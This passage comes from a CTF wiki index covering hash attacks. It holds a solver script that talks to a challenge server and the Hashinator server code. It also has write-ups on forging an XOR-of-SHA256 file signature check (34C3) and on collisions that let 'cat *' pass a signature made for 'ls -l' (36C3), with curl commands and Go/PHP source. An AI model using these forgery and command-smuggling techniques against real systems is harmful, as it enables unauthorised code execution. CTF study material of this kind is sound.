sha(bytestring):\n    return hashlib.sha1(bytestring).digest()\ndef blake(bytestring):\n    return hashlib.blake2b(bytestring).digest()\ndef scrypt(bytestring):\n    l = int(len(bytestring) / 2)\n    salt = bytestring[:l]\n    p = bytestring[l:]\n    return hashlib.scrypt(p, salt=salt, n=2**16, r=8, p=1, maxmem=67111936)\n    # return pyscrypt.hash(p, salt, 2**16, 8, 1, dkLen=64)\ndef xor(s1, s2):\n    return b''.join([bytes([s1[i] ^ s2[i % len(s2)]]) for i in range(len(s1))])\ndef main():\n    # io = socket.socket(family=socket.AF_INET)\n    # io.connect(('47.88.216.38', 20013))\n    io = remote('47.88.216.38', 20013)\n    print(io.recv(1000))\n    ans_array = bytearray()\n    while True:\n        buf = io.recv(1)\n        if buf:\n            ans_array.extend(buf)\n        if buf == b'!':\n            break\n\n    password_hash_base64 = ans_array[ans_array.find(b\"b'\") + 2: ans_array.find(b\"'\\n\")]\n    password_hash = b64decode(password_hash_base64)\n    print('password:', password_hash)\n    method_bytes = ans_array[\n        ans_array.find(b'used:\\n') + 6 : ans_array.find(b'\\nYour')\n    ]\n    methods = method_bytes.split(b'\\n')\n    methods = [bytes(x.strip(b'- ')).decode() for x in methods]\n    print(methods)\n    in_salt = password_hash[:64]\n    in_hash = password_hash[64:]\n    for pos, neg in zip(methods, methods[::-1]):\n'''\n            interim_salt = xor(interim_salt, hash_rounds[-1-i](interim_hash))\n            interim_hash = xor(interim_hash, hash_rounds[i](interim_salt))\n        '''\n        in_hash = xor(in_hash, eval(\"{}(in_salt)\".format(neg)))\n        in_salt = xor(in_salt, eval(\"{}(in_hash)\".format(pos)))\n    print(in_hash, in_salt)\n    print(in_hash[-20:])\n    io.interactive()\nmain()\n</code></pre></p>"},{"location":"crypto/hash/attack/#hash_1","title":"\u539fhash\u7b97\u6cd5","text":"<pre><code>import os\nimport hashlib\nimport socket\nimport threading\nimport socketserver\nimport struct\nimport time\n\n# import pyscrypt\n\nfrom base64 import b64encode\n\ndef md5(bytestring):\n    return hashlib.md5(bytestring).digest()\n\ndef sha(bytestring):\n    return hashlib.sha1(bytestring).digest()\n\ndef blake(bytestring):\n    return hashlib.blake2b(bytestring).digest()\n\ndef scrypt(bytestring):\n    l = int(len(bytestring) / 2)\n    salt = bytestring[:l]\n    p = bytestring[l:]\n    return hashlib.scrypt(p, salt=salt, n=2**16, r=8, p=1, maxmem=67111936)\n    # return pyscrypt.hash(p, salt, 2**16, 8, 1)\n\ndef xor(s1, s2):\n    return b''.join([bytes([s1[i] ^ s2[i % len(s2)]]) for i in range(len(s1))])\n\nclass HashHandler(socketserver.BaseRequestHandler):\n\n    welcome_message = \"\"\"\nWelcome, young wanna-be Cracker, to the Hashinator.\n\nTo prove your worthiness, you must display the power of your cracking skills.\n\nThe test is easy:\n1. We send you a password from the rockyou list, hashed using multiple randomly chosen algorithms.\n2. You crack the hash and send back the original password.\n\nAs you already know the dictionary and won't need any fancy password rules, {} seconds should be plenty, right?\n\nPlease wait while we generate your hash...\n    \"\"\"\n\n    hashes = [md5, sha, blake, scrypt]\n    timeout = 10\n    total_rounds = 32\n\n    def handle(self):\n        self.request.sendall(self.welcome_message.format(self.timeout).encode())\n\n        password = self.generate_password()     # from rock_you.txt\n        salt = self.generate_salt(password)     # \u4e0epassword\u7684\u957f\u5ea6\u6709\u5173\n        hash_rounds = self.generate_rounds()    # \u751f\u6210\u8fdb\u884chash\u7b97\u6cd5\u7684\u987a\u5e8f\n        password_hash = self.calculate_hash(salt + password, hash_rounds)\n        self.generate_delay()\n\n        self.request.sendall(\"Challenge password hash: {}\\n\".format(b64encode(password_hash)).encode())\n        self.request.sendall(\"Rounds used:\\n\".encode())\n        test_rounds = []\n        for r in hash_rounds:\n            test_rounds.append(r)\n\n        for r in hash_rounds:\n            self.request.sendall(\"- {}\\n\".format(r.__name__).encode())\n        self.request.sendall(\"Your time starts now!\\n\".encode())\n        self.request.settimeout(self.timeout)\n        try:\n            response = self.request.recv(1024)\n            if response.strip() == password:\n                self.request.sendall(\"Congratulations! You are a true cracking master!\\n\".encode())\n                self.request.sendall(\"Welcome to the club: {}\\n\".format(flag).encode())\n                return\n        except socket.timeout:\n            pass\n        self.request.sendall(\"Your cracking skills are bad, and you should feel bad!\".encode())\n\n\n    def generate_password(self):\n        rand = struct.unpack(\"I\", os.urandom(4))[0]\n        lines = 14344391 # size of rockyou\n        line = rand % lines\n        password = \"\"\n        f = open('rockyou.txt', 'rb')\n        for i in range(line):\n            password = f.readline()\n        return password.strip()\n\n    def generate_salt(self, p):\n        msize = 128 # f-you hashcat :D\n        salt_size = msize - len(p)\n        return os.urandom(salt_size)\n\n    def generate_rounds(self):\n        rand = struct.unpack(\"Q\", os.urandom(8))[0]\n        rounds = []\n        for i in range(self.total_rounds):\n            rounds.append(self.hashes[rand % len(self.hashes)])\n            rand = rand &gt;&gt; 2\n        return rounds\n\n    def calculate_hash(self, payload, hash_rounds):\n        interim_salt = payload[:64]\n        interim_hash = payload[64:]\n        for i in range(len(hash_rounds)):\n            interim_salt = xor(interim_salt, hash_rounds[-1-i](interim_hash))\n            interim_hash = xor(interim_hash, hash_rounds[i](interim_salt))\n'''\n            interim_hash = xor(\n                interim_hash,\n                hash_rounds[i](\n                    xor(interim_salt, hash_rounds[-1-i](interim_hash))\n                )\n            )\n            '''\n        final_hash = interim_salt + interim_hash\n        return final_hash\n\n    def generate_delay(self):\n        rand = struct.unpack(\"I\", os.urandom(4))[0]\n        time.sleep(rand / 1000000000.0)\n\n\n\nclass ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):\n    allow_reuse_address = True\n\nPORT = 1337\nHOST = '0.0.0.0'\nflag = \"\"\n\nwith open(\"flag.txt\") as f:\n    flag = f.read()\n\ndef main():\n    server = ThreadedTCPServer((HOST, PORT), HashHandler)\n    server_thread = threading.Thread(target=server.serve_forever)\n    server_thread.start()\n    server_thread.join()\n\nif __name__ == \"__main__\":\n    main()\n</code></pre>"},{"location":"crypto/hash/complex/","title":"\u7efc\u5408\u9898\u76ee","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"crypto/hash/complex/#2017-34c3-software_update","title":"2017 34c3 Software_update","text":"<p>\u53ef\u4ee5\u770b\u51fa\uff0c\u7a0b\u5e8f\u7684\u5927\u6982\u610f\u601d\u662f\u4e0a\u4f20\u4e00\u4e2a zip \u538b\u7f29\u5305\uff0c\u7136\u540e\u5bf9 signed_data \u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u8fdb\u884c\u7b7e\u540d\u9a8c\u8bc1\u3002\u5176\u4e2d\uff0c\u6700\u540e\u9a8c\u8bc1\u7684\u624b\u6cd5\u662f\u5927\u6982\u662f\u5c06\u6bcf\u4e00\u4e2a\u6587\u4ef6\u8fdb\u884c sha256 \u54c8\u5e0c\uff0c\u7136\u540e\u5f02\u6216\u8d77\u6765\u4f5c\u4e3a\u8f93\u5165\u4f20\u9012\u7ed9 rsa \u8fdb\u884c\u7b7e\u540d\u3002\u5982\u679c\u901a\u8fc7\u9a8c\u8bc1\u7684\u8bdd\uff0c\u5c31\u4f1a\u6267\u884c\u5bf9\u5e94\u7684 pre-copy.py \u548c post-copy.py \u6587\u4ef6\u3002</p> <p>\u5f88\u81ea\u7136\u7684\u60f3\u6cd5\u662f\u6211\u4eec\u4fee\u6539 pre-copy.py \u6216\u8005 post-copy.py \u6587\u4ef6\uff0c\u4f7f\u5176\u53ef\u4ee5\u8bfb\u53d6 flag\uff0c\u7136\u540e\u518d\u6b21\u7ed5\u8fc7\u7b7e\u540d\u5373\u53ef\u3002\u4e3b\u8981\u6709\u4e24\u79cd\u601d\u8def</p> <ol> <li>\u6839\u636e\u7ed9\u5b9a\u7684\u516c\u94a5\u6587\u4ef6\u83b7\u53d6\u5bf9\u5e94\u7684\u79c1\u94a5\uff0c\u8fdb\u800c\u518d\u4fee\u6539\u6587\u4ef6\u540e\u4f2a\u9020\u7b7e\u540d\uff0c\u7136\u540e\u5927\u6982\u770b\u4e86\u770b\u516c\u94a5\u6587\u4ef6\u51e0\u4e4e\u4e0d\u53ef\u7834\uff0c\u6240\u4ee5\u8fd9\u4e00\u70b9\uff0c\u57fa\u672c\u4e0a\u53ef\u4ee5\u653e\u5f03\u3002</li> <li>\u4fee\u6539\u5bf9\u5e94\u6587\u4ef6\u540e\uff0c\u5229\u7528\u5f02\u6216\u7684\u7279\u6027\u4f7f\u5f97\u5176\u54c8\u5e0c\u503c\u4ecd\u7136\u4e0e\u539f\u6765\u76f8\u540c\uff0c\u4ece\u800c\u7ed5\u8fc7\u7b7e\u540d\u68c0\u6d4b\u3002\u5373\u4f7f\u5f97 signed_data \u76ee\u5f55\u4e0b\u5305\u542b\u591a\u4e2a\u6587\u4ef6\uff0c\u4f7f\u5f97\u8fd9\u4e9b\u6587\u4ef6\u7684\u54c8\u5e0c\u503c\u6700\u540e\u5f02\u6216\u8d77\u6765\u53ef\u4ee5\u62b5\u6d88\u4fee\u6539 pre-copy.py \u6216\u8005 post-copy.py\u6587\u4ef6\u6240\u9020\u6210\u7684\u54c8\u5e0c\u503c\u7684\u4e0d\u540c\u3002</li> </ol> <p>\u8fd9\u91cc\uff0c\u6211\u4eec\u9009\u62e9\u7b2c\u4e8c\u79cd\u65b9\u6cd5\uff0c\u8fd9\u91cc\u6211\u4eec\u9009\u62e9\u4fee\u6539 pre-copy.py \u6587\u4ef6\uff0c\u5177\u4f53\u601d\u8def\u5982\u4e0b</p> <ol> <li>\u8ba1\u7b97 pre-copy.py \u7684\u539f hash \u503c\u3002</li> <li>\u4fee\u6539 pre-copy.py \u6587\u4ef6\uff0c\u4f7f\u5176\u53ef\u4ee5\u8bfb\u53d6 flag\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u8ba1\u7b97\u65b0\u7684 hash \u503c\u3002\u5c06\u4e24\u8005\u5f02\u6216\uff0c\u6c42\u5f97\u5f02\u6216\u5dee\u503c delta\u3002</li> <li>\u5bfb\u627e\u4e00\u7cfb\u5217\u7684\u6587\u4ef6\uff0c\u4f7f\u5176 hash \u503c\u5f02\u6216\u8d77\u6765\u6b63\u597d\u4e3a delta\u3002</li> </ol> <p>\u5173\u952e\u7684\u6b65\u9aa4\u5728\u4e8e\u7b2c\u4e09\u6b65\uff0c\u800c\u5176\u5b9e\u8fd9\u4e2a\u6587\u4ef6\u53ef\u4ee5\u770b\u505a\u662f\u4e00\u4e2a\u7ebf\u6027\u7ec4\u5408\u7684\u95ee\u9898\uff0c\u5373\u5bfb\u627e\u82e5\u5e72\u4e2a 256 \u7ef401\u5411\u91cf\u4f7f\u5176\u5f02\u6216\u503c\u4e3a delta\u3002\u800c  $$ (F={0,1},F^{256},\\oplus ,\\cdot) $$ \u662f\u4e00\u4e2a 256 \u7ef4\u7684\u5411\u91cf\u7a7a\u95f4\u3002\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u6c42\u5f97\u8be5\u5411\u91cf\u7a7a\u95f4\u7684\u4e00\u4e2a\u57fa\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u6c42\u5f97\u8be5\u7a7a\u95f4\u4e2d\u4efb\u610f\u6307\u5b9a\u503c\u7684\u6240\u9700\u8981\u7684\u5411\u91cf\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 sage \u6765\u8f85\u52a9\u6211\u4eec\u6c42\uff0c\u5982\u4e0b</p> <pre><code># generage the base of &lt;{0,1},F^256,xor,*&gt;\ndef gen_gf2_256_base():\n    v = VectorSpace(GF(2), 256)\n    tmphash = compute_file_hash(\"0.py\", \"\")\n    tmphash_bin = hash2bin(tmphash)\n    base = [tmphash_bin]\n    filelist = ['0.py']\n    print base\n    s = v.subspace(base)\n    dim = s.dimension()\n    cnt = 1\n    while dim != 256:\n        tmpfile = str(cnt) + \".py\"\n        tmphash = compute_file_hash(tmpfile, \"\")\n        tmphash_bin = hash2bin(tmphash)\n        old_dim = dim\n        s = v.subspace(base + [tmphash_bin])\n        dim = s.dimension()\n        if dim &gt; old_dim:\n            base += [tmphash_bin]\n            filelist.append(tmpfile)\n            print(\"dimension \" + str(s.dimension()))\n        cnt += 1\n        print(cnt)\n    m = matrix(GF(2), 256, 256, base)\n    m = m.transpose()\n    return m, filelist\n</code></pre> <p>\u5173\u4e8e\u66f4\u52a0\u8be6\u7ec6\u7684\u89e3\u7b54\uff0c\u8bf7\u53c2\u8003 <code>exp.py</code>\u3002</p> <p>\u8fd9\u91cc\u6211\u4fee\u6539 pre-copy \u591a\u8f93\u51fa  <code>!!!!come here!!!!</code> \u5b57\u773c\uff0c\u5982\u4e0b</p> <pre><code>\u279c  software_update git:(master) python3 installer.py now.zip\nPreparing to copy data...\n!!!!come here!!!!\nSoftware update installed successfully.\n</code></pre> <p>\u53c2\u8003\u6587\u732e</p> <ul> <li>https://sectt.github.io/writeups/34C3CTF/crypto_182_software_update/Readme</li> <li>https://github.com/OOTS/34c3ctf/blob/master/software_update/solution/exploit.py</li> </ul>"},{"location":"crypto/hash/complex/#2019-36c3-sav-ls-l-aas","title":"2019 36c3 SaV-ls-l-aaS","text":"<p>\u8fd9\u4e2a\u9898\u7684\u5206\u7c7b\u662f Crypto&amp;Web\uff0c\u634b\u4e00\u4e0b\u6d41\u7a0b\uff1a</p> <p>60601\u7aef\u53e3\u5f00\u7740\u4e00\u4e2aWeb\u670d\u52a1\uff0c\u9898\u76ee\u63cf\u8ff0\u7ed9\u4e86\u8fde\u63a5\u65b9\u6cd5\uff1a</p> <pre><code>url='http://78.47.240.226:60601' &amp;&amp; ip=$(curl -s \"$url/ip\") &amp;&amp; sig=$(curl -s -d \"cmd=ls -l&amp;ip=$ip\" \"$url/sign\") &amp;&amp; curl --data-urlencode \"signature=$sig\" \"$url/exec\"\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u5148\u662f\u8bbf\u95ee <code>/ip</code> \u5f97\u5230 ip\uff0c\u518d\u5411 <code>/sign</code> post \u8fc7\u53bb ip \u548c\u6211\u4eec\u8981\u6267\u884c\u7684\u547d\u4ee4\uff0c\u5f97\u5230\u7b7e\u540d\uff0c\u6700\u540e\u5411 <code>/exec</code> post signature \u6765\u6267\u884c\u547d\u4ee4\u3002\u6211\u4eec\u6267\u884c\u8fd9\u4e00\u884c\u53ef\u4ee5\u53d1\u73b0\u56de\u663e\u4e86<code>ls -l</code>\u6267\u884c\u7684\u7ed3\u679c\uff0c\u53d1\u73b0\u6709\u4e2a flag.txt\u3002</p> <p>\u770b\u6e90\u7801\uff0cWeb \u670d\u52a1\u662f\u7531 go \u8d77\u7684\uff1a</p> <pre><code>package main\n\nimport (\n\"bytes\"\n\"crypto/sha1\"\n\"encoding/json\"\n\"fmt\"\n\"io\"\n\"io/ioutil\"\n\"log\"\n\"net\"\n\"net/http\"\n\"strings\"\n\"time\"\n)\n\nfunc main() {\nm := http.NewServeMux()\n\nm.HandleFunc(\"/ip\", func(w http.ResponseWriter, r *http.Request) {\nip, _, err := net.SplitHostPort(r.RemoteAddr)\nif err != nil {\nreturn\n}\nfmt.Fprint(w, ip)\n})\n\nm.HandleFunc(\"/sign\", func(w http.ResponseWriter, r *http.Request) {\nip, _, err := net.SplitHostPort(r.RemoteAddr)\nif err != nil {\nreturn\n}\nremoteAddr := net.ParseIP(ip)\nif remoteAddr == nil {\nreturn\n}\n\nip = r.PostFormValue(\"ip\")\nsignIP := net.ParseIP(ip)\nif signIP == nil || !signIP.Equal(remoteAddr) {\nfmt.Fprintln(w, \"lol, not ip :&gt;\")\nreturn\n}\n\ncmd := r.PostFormValue(\"cmd\")\nif cmd != \"ls -l\" {\nfmt.Fprintln(w, \"lol, nope :&gt;\")\nreturn\n}\n\nmsg := ip + \"|\" + cmd\ndigest := sha1.Sum([]byte(msg))\n\nb := new(bytes.Buffer)\nerr = json.NewEncoder(b).Encode(string(digest[:]))\nif err != nil {\nreturn\n}\n\nresp, err := http.Post(\"http://127.0.0.1/index.php?action=sign\", \"application/json; charset=utf-8\", b)\nif err != nil || resp.StatusCode != 200 {\nfmt.Fprintln(w, \"oops, hsm is down\")\nreturn\n}\n\nbody, err := ioutil.ReadAll(resp.Body)\nif err != nil {\nfmt.Fprintln(w, \"oops, hsm is bodyless?\")\nreturn\n}\n\nvar signature string\nerr = json.Unmarshal(body, &amp;signature)\nif err != nil {\nfmt.Fprintln(w, \"oops, hsm is jsonless?\")\nreturn\n}\n\nfmt.Fprint(w, signature+msg)\n})\n\nm.HandleFunc(\"/exec\", func(w http.ResponseWriter, r *http.Request) {\nip, _, err := net.SplitHostPort(r.RemoteAddr)\nif err != nil {\nreturn\n}\nremoteAddr := net.ParseIP(ip)\nif remoteAddr == nil {\nreturn\n}\n\nsignature := r.PostFormValue(\"signature\")\ndigest := sha1.Sum([]byte(signature[172:]))\n\nb := new(bytes.Buffer)\nerr = json.NewEncoder(b).Encode(signature[:172] + string(digest[:]))\nif err != nil {\nfmt.Fprintln(w, \"oops, json encode\")\nreturn\n}\n\nresp, err := http.Post(\"http://127.0.0.1/index.php?action=verify\", \"application/json; charset=utf-8\", b)\nif err != nil || resp.StatusCode != 200 {\nfmt.Fprintln(w, \"oops, hsm is down?\")\nreturn\n}\n\nbody, err := ioutil.ReadAll(resp.Body)\nif err != nil {\nfmt.Fprintln(w, \"oops, hsm is bodyless?\")\nreturn\n}\n\nvar valid bool\nerr = json.Unmarshal(body, &amp;valid)\nif err != nil {\nfmt.Fprintln(w, \"oops, json unmarshal\")\nreturn\n}\n\nif valid {\nt := strings.Split(signature[172:], \"|\")\nif len(t) != 2 {\nfmt.Fprintln(w, \"oops, split\")\n}\n\nsignIP := net.ParseIP(t[0])\nif signIP == nil || !signIP.Equal(remoteAddr) {\nfmt.Fprintln(w, \"lol, not ip :&gt;\")\nreturn\n}\n\nconn, err := net.DialTimeout(\"tcp\", \"127.0.0.1:1024\", 1*time.Second)\nif err != nil {\nfmt.Fprintln(w, \"oops, dial\")\nreturn\n}\nfmt.Fprintf(conn, t[1]+\"\\n\")\nconn.(*net.TCPConn).CloseWrite()\nio.Copy(w, conn)\n}\n})\n\ns := &amp;http.Server{\nAddr:           \":60601\",\nHandler:        m,\nReadTimeout:    5 * time.Second,\nWriteTimeout:   5 * time.Second,\nMaxHeaderBytes: 1 &lt;&lt; 20,\n}\nlog.Fatal(s.ListenAndServe())\n}\n</code></pre> <p>\u4ee3\u7801\u5f88\u5bb9\u6613\u770b\uff0c\u9650\u5236\u4e86 cmd \u53ea\u80fd\u662f<code>ls -l</code>\uff0c\u5176\u4f59\u4e0d\u7ed9\u7b7e\u540d\uff0c\u770b\u6837\u5b50\u6211\u4eec\u662f\u8981\u4f2a\u9020\u5176\u4ed6\u547d\u4ee4\u7684\u7b7e\u540d\u6765\u8bfbflag\uff0c\u8fd9\u91cc\u6ce8\u610f\u5230\u7b7e\u540d\u548c\u9a8c\u7b7e\u7684\u8fc7\u7a0b\u662f\u4f20\u7ed9\u672c\u5730\u8d77\u7684\u4e00\u4e2a php \u6765\u5b8c\u6210\u7684\uff0c\u770b\u4e00\u4e0b\u8fd9\u90e8\u5206\u6e90\u7801\uff1a</p> <pre><code>&lt;?php\ndefine('ALGO', 'md5WithRSAEncryption');\n$d = json_decode(file_get_contents('php://input'), JSON_THROW_ON_ERROR);\n\nif ($_GET['action'] === 'sign'){\n    $pkeyid = openssl_pkey_get_private(\"file:///var/www/private_key.pem\");\n    openssl_sign($d, $signature, $pkeyid, ALGO);\n    echo json_encode(base64_encode($signature));\n    openssl_free_key($pkeyid);\n}\nelseif ($_GET['action'] === 'verify') {\n    $pkeyid = openssl_pkey_get_public(\"file:///var/www/public_key.pem\");\n    echo json_encode(openssl_verify(substr($d, 172), base64_decode(substr($d,0, 172)), $pkeyid, ALGO) === 1);\n    openssl_free_key($pkeyid);\n}\n</code></pre> <p>\u91c7\u7528\u7684\u662f<code>md5WithRSAEncryption</code>\u7684\u65b9\u5f0f\u7b7e\u540d\uff0c\u672c\u5730\u8bd5\u4e86\u4e00\u4e0b\uff0c\u662f\u628a\u6211\u4eec\u4f20\u5165\u7684 <code>$d</code> md5 \u540e\u8f6c\u4e3ahex\uff0c\u586b\u5145\u5230<code>0x1ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff003020300c06082a864886f70d020505000410</code>\u540e\u9762\uff0c\u7ec4\u6210\u6570\u5b57\u7136\u540e\u7528RSA\u7b7e\u540d\u3002</p> <p>\u770b\u6837\u5b50\u6574\u4e2a\u903b\u8f91\u627e\u4e0d\u5230\u4e00\u70b9\u95ee\u9898\uff0c\u7528\u7684\u90fd\u662f\u6807\u51c6\u5e93\uff0c\u57fa\u672c\u65e0\u6cd5\u653b\u51fb\u3002\u6709\u4e2a\u601d\u8def\u662f\u901a\u8fc7\u4ee3\u7406\u66f4\u6362 ip\uff0c\u53ef\u4ee5\u62ff\u5230\u4e24\u4e2a ip|ls -l \u7684\u7b7e\u540d\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u62e5\u6709\u4e86\u4e24\u7ec4 RSA \u7684 m \u548c c\uff0c\u56e0\u4e3a\u9898\u76ee\u7ed9\u4e86 dockerfile \u7ed9\u4e86\u751f\u6210\u516c\u79c1\u94a5\u7684\u65b9\u6cd5\uff0c\u4f7f\u7528 openssl \u9ed8\u8ba4\u751f\u6210\uff0ce\u4e3a65537\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6c42\u516c\u56e0\u6570\u7684\u65b9\u5f0f\u6765\u6c42\u51fa n\u3002</p> <p>\u5728\u5f97\u5230\u4e24\u7ec4\u7b7e\u540d\u540e\uff0c\u6211\u4eec\u8981\u5f97\u5230 RSA \u7684m\uff0c\u5c31\u662f\u586b\u5145\u540e\u7684\u6570\uff0c\u6240\u4ee5\u6309\u7167\u4ee3\u7801\u903b\u8f91\uff0c\u5728 go \u91cc\u9762\u5148\u662f sha1:</p> <pre><code>msg := ip + \"|\" + cmd\ndigest := sha1.Sum([]byte(msg))\n\nb := new(bytes.Buffer)\nerr = json.NewEncoder(b).Encode(string(digest[:]))\n</code></pre> <p>\u518d php \u91cc\u7684 md5\uff0c\u5f97\u5230\u4e24\u7ec4 m \u548c c\uff0c\u4f46\u662f\u603b\u662f\u6c42\u4e0d\u51fa\u516c\u56e0\u6570 n\uff0c\u6000\u7591\u6c42\u7684 m \u4e0d\u5bf9\u3002\u770b\u4ee3\u7801\u53d1\u73b0 go \u91cc\u628a sha1\u7684\u7ed3\u679c\u7528 json \u7f16\u7801\uff0c\u7136\u540e\u4f20\u5230 php\u91cc json \u89e3\u7801\u3002\u8fd9\u90e8\u5206\u975e\u5e38\u53ef\u7591\uff0c\u4e3a\u4f55\u8981\u7528 json \u7f16\u7801\uff08\u7528 hex \u4f20\u8fc7\u53bb\u5b83\u4e0d\u9999\u4e48\uff09\uff0c\u672c\u5730\u642d\u4e00\u4e0b\u73af\u5883\u8ddf\u4e00\u4e0b\u3002\uff08\u9898\u76ee\u7ed9\u4e86dockerfile\uff09</p> <p>\u8d77\u4e2adocker\uff0c\u6539\u4e00\u4e0b index.php\uff0c\u52a0\u4e00\u4e2a<code>var_dump($d);</code>\uff0c\u518d\u6539\u4e00\u4e0b go\uff0c\u8fd4\u56de\u4e00\u4e0b php \u7684\u7ed3\u679c\uff1a</p> <pre><code>fmt.Fprintln(w,string(body))\n</code></pre> <p>\u73b0\u5728\u8ba9\u7a0b\u5e8f\u7b7e\u540d\uff0c\u8fd4\u56de\u7ed3\u679c\uff1a</p> <pre><code>string(38) \"\u000e   \n\ufffd\u0012\ufffd.\ufffd\ufffd\ufffd?-\ufffdKC\ufffd\u0005\ufffd@\ufffd\"\n\"K4FEmxz4yuTsjDAbRZQmHJ+MBiCSGaOnpZTLbThXpCkDYe3siAIPfihX6ppjN2Tz6XqOr4tF\\/u1\\/+ccfhj8NNLIL+2hknyDXbosmMBV8mEGYsMqQHAE0f+3OhDWlzN5RnteSMYNZbTipFErB8ZOWCiXmynWxsqJhyaN9J6\\/\\/h6I=\"\noops, hsm is jsonless?\n</code></pre> <p>$d \u7adf\u7136\u662f\u957f\u5ea6\u4e3a 38 \u7684\u5b57\u7b26\u4e32\uff0c\u770b\u6765\u679c\u7136\u662f\u8fd9\u91cc\u7f16\u7801\u6709\u95ee\u9898\uff0c\u6211\u4eec\u9700\u8981\u770b\u4e00\u4e0b\u6bcf\u4e2a\u6b65\u9aa4\u7684\u7ed3\u679c\uff0c\u5148\u770b\u4e00\u4e0b go \u91cc json\u7f16\u7801\u540e\u7684 sha1 \u7ed3\u679c\u662f\u4ec0\u4e48\uff1a</p> <pre><code>package main\n\nimport (\n\"bytes\"\n\"crypto/sha1\"\n\"encoding/json\"\n\"fmt\"\n)\nfunc main() {\nmsg := \"172.17.0.1|ls -l\"\ndigest := sha1.Sum([]byte(msg))\n\nb := new(bytes.Buffer)\njson.NewEncoder(b).Encode(string(digest[:]))\nfmt.Print(string(b.Bytes()));\n}\n</code></pre> <p>\u8fd0\u884c\u4e00\u4e0b\uff1a</p> <pre><code>\"\\u000e\\t\\u001d\\ufffd\\u0012\\ufffd.\\ufffd\\ufffd\\ufffd?-\\ufffdKC\\ufffd\\u0005\\ufffd@\\ufffd\"\n</code></pre> <p>\u548c\u6b63\u5e38\u7684sha1\u7684\u7ed3\u679c\u6765\u6bd4\u8f83\u4e00\u4e0b\uff1a</p> <pre><code>Python 2.7.16 (default, Sep  2 2019, 11:59:44)\n[GCC 4.2.1 Compatible Apple LLVM 10.0.1 (clang-1001.0.46.4)] on darwin\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n&gt;&gt;&gt; \"\\u000e\\t\\u001d\\ufffd\\u0012\\ufffd.\\ufffd\\ufffd\\ufffd?-\\ufffdKC\\ufffd\\u0005\\ufffd@\\ufffd\"\n'\\\\u000e\\t\\\\u001d\\\\ufffd\\\\u0012\\\\ufffd.\\\\ufffd\\\\ufffd\\\\ufffd?-\\\\ufffdKC\\\\ufffd\\\\u0005\\\\ufffd@\\\\ufffd'\n&gt;&gt;&gt; from hashlib import *\n&gt;&gt;&gt; sha1('172.17.0.1|ls -l').digest()\n'\\x0e\\t\\x1d\\xbd\\x12\\x90.\\xca\\xf0\\xd9?-\\x98KC\\xeb\\x05\\xa1@\\xd1'\n</code></pre> <p>\u7531\u4e8e go \u7684 json \u7f16\u7801\uff0c\u5f88\u591a\u4e0d\u53ef\u89c1\u5b57\u7b26\u90fd\u88ab\u8f6c\u4e3a\u4e86 <code>U+fffd</code>\uff0c\u4e22\u5931\u4e86\u5f88\u591a\u4fe1\u606f\u3002</p> <p>\u518d\u7ecf\u8fc7 php \u63a5\u53e3\u7684\u63a5\u6536\uff0c\u6211\u4eec\u6765\u770b\u4e00\u4e0b\u7ed3\u679c\uff1a</p> <pre><code>$d = json_decode(file_get_contents('php://input'), JSON_THROW_ON_ERROR);\nvar_dump(file_get_contents('php://input'));\nvar_dump($d);\nvar_dump(bin2hex($d));\n</code></pre> <p>\u7ed3\u679c\uff1a</p> <pre><code>string(89) \"\"\\u000e\\t\\u001d\\ufffd\\u0012\\ufffd.\\ufffd\\ufffd\\ufffd?-\\ufffdKC\\ufffd\\u0005\\ufffd@\\ufffd\"\n\"\nstring(38) \"\u000e   \n\ufffd\u0012\ufffd.\ufffd\ufffd\ufffd?-\ufffdKC\ufffd\u0005\ufffd@\ufffd\"\nstring(76) \"0e091defbfbd12efbfbd2eefbfbdefbfbdefbfbd3f2defbfbd4b43efbfbd05efbfbd40efbfbd\"\n\"K4FEmxz4yuTsjDAbRZQmHJ+MBiCSGaOnpZTLbThXpCkDYe3siAIPfihX6ppjN2Tz6XqOr4tF\\/u1\\/+ccfhj8NNLIL+2hknyDXbosmMBV8mEGYsMqQHAE0f+3OhDWlzN5RnteSMYNZbTipFErB8ZOWCiXmynWxsqJhyaN9J6\\/\\/h6I=\"\noops, hsm is jsonless?\n</code></pre> <p><code>U+fffd</code>\u53d8\u6210\u4e86<code>\\xef\\xbf\\xbd</code>\u3002\u6240\u4ee5\u7531\u4e8e go \u7684 json \u7f16\u7801\u95ee\u9898\uff0c\u4e22\u5931\u4e86\u5f88\u591a\u4fe1\u606f\uff0c\u9020\u6210\u4e86 md5 \u524d\u7684\u6570\u636e\u6709\u5f88\u591a\u76f8\u540c\u5b57\u7b26\u3002\u5f53\u65f6\u505a\u9898\u65f6\u5f80\u4e0b\u5e76\u6ca1\u6709\u7ec6\u60f3\uff0c\u5f97\u5230 n \u540e\u603b\u662f\u60f3\u6784\u9020\u51fa\u4efb\u610f\u547d\u4ee4\u7684\u7b7e\u540d\uff0c\u4e5f\u5f88\u7591\u60d1\u5982\u679c\u6784\u9020\u51fa\u5c82\u4e0d\u662f\u8fd9\u79cd\u7b7e\u540d\u5c31\u4e0d\u5b89\u5168\u4e86\uff1f\u5176\u5b9e\u662f\u65e0\u6cd5\u5f97\u5230\u7684\u3002</p> <p>\u6b63\u89e3\u662f go \u7684\u8fd9\u79cd\u95ee\u9898 \uff0c\u4e3a\u78b0\u649e\u521b\u9020\u4e86\u6761\u4ef6\u3002\u6211\u4eec\u53ef\u4ee5\u78b0\u649e\u51fa\u5728\u8fd9\u79cd\u7f16\u7801\u60c5\u51b5\u4e0b\u4e0e <code>ls -l</code>\u6709\u76f8\u540c\u7ed3\u679c\u7684<code>cat *</code> 